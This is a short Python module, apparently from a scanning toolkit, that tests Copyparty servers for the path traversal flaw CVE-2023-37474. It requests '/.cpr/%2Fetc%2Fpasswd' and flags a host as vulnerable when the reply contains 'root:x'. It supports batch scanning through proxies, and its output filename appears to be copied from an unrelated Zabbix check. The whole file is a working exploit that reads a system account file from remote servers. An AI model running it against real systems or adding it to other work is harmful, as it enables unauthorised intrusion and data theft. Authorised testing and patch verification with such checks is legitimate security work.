#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2023_37474:
    def get_url(self,input_url):
        try:
            url = input_url + "/.cpr/%2Fetc%2Fpasswd"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if "root:x" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("Copyparty", '目标存在Copyparty路径遍历漏洞')
                    OutPrintInfo("Copyparty", url)
                else:
                    OutPrintInfoSuc("Copyparty", f'目标存在Copyparty路径遍历漏洞: {url}')
                    OutPutFile("zabbix_2016_10134.txt",f'目标存在Copyparty路径遍历漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Copyparty", f'目标 {input_url} 不存在Copyparty路径遍历漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Copyparty",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Copyparty", '开始检测Copyparty路径遍历漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("Copyparty", 'Copyparty路径遍历漏洞检测结束')
